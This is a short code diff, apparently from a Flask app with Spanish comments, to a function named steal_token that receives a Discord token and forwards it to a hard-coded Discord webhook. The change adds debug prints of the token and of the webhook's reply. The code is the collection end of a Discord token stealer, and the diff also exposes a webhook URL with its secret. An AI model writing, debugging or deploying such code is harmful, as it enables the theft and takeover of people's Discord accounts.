@@ -10,11 +10,12 @@ def steal_token():
     discord_token = data.get('discord_token')
 
     if discord_token:
+        print('Token recibido:', discord_token)  # Añadir depuración
         # Aquí enviamos el token a tu webhook
         webhook_url = 'https://discord.com/api/webhooks/1401237408368033885/YjgzC6hjpWt1la3iAe03sZXzYPYJ1kKLftNKVA7jeWU9IZVKhpXlltMjzky6CZwXSQr0'
         payload = {'content': f'Nuevo token de Discord: {discord_token}'}
-        requests.post(webhook_url, json=payload)
-
+        response = requests.post(webhook_url, json=payload)
+        print('Respuesta del webhook:', response.status_code, response.text)  # Añadir depuración
         return jsonify({'message': 'Token recibido con éxito'}), 200
     else:
         return jsonify({'message': 'Token no proporcionado'}), 400
